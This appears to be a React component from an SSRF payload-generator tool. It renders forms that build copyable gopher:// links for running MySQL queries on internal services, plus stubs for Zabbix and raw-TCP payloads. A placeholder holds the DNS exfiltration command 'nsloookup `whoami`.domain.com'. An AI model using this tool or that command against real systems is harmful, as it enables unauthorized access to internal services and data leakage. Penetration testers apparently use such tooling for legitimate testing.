import React, { useState, useEffect } from 'react';
import { Form, Input, Typography, message } from 'antd';
import { useStore, GopherPayload } from '../store';
import Paragraph from 'antd/es/typography/Paragraph';

const { Text } = Typography;

const FormRenderer: React.FC = () => {
  const payload = useStore((state) => state.payload);
  const generateMysqlSSRF = useStore((state) => state.generateMysqlSSRF);

  const [username, setUsername] = useState('');
  const [query, setQuery] = useState('');
  const [gopherLink, setGopherLink] = useState('');

  useEffect(() => {
    if (payload === GopherPayload.MySQL) {
      if (username === '' || query === '') {
        return setGopherLink('Fill the required fields to generate the gopher payload');
      }
      setGopherLink(generateMysqlSSRF(username, query));
    }
  }, [username, query, payload, generateMysqlSSRF]);

  const handleCopy = async () => {
    try {
      await navigator.clipboard.writeText(gopherLink);
      message.success('Copied to clipboard!');
    } catch (err) {
      message.error('Failed to copy text');
    }
  };

  switch (payload) {
    case 'Zabbix':
      return (
        <Form>
          {/* Your form for Zabbix payload */}
          <Form.Item label="Bash comand to execute">
            <Input placeholder="nsloookup `whoami`.domain.com" />
          </Form.Item>
        </Form>
      );
    case GopherPayload.MySQL:
      return (
        <Form>
          {/* Your form for MySQL payload */}
          <Form.Item label="MySQL Username">
            <Input placeholder="Enter username" value={username} onChange={(e) => setUsername(e.target.value)} required />
          </Form.Item>
          <Form.Item label="Query to execute">
            <Input placeholder="SELECT column FROM table;" value={query} onChange={(e) => setQuery(e.target.value)} required />
          </Form.Item>
          {/* HERE copyable gopher link */}
          <Paragraph><pre>
            <Text copyable>
              {gopherLink}
            </Text>
          </pre></Paragraph>
        </Form>
      );
    case 'Custom':
      return (
        <Form>
          {/* Your form for custom payload */}
          <Form.Item label="Raw tcp protocol message">
            <Input placeholder="Enter raw tcp protocol message" />
          </Form.Item>
        </Form>
      );
    default:
      return null;
  }
};

export default FormRenderer;
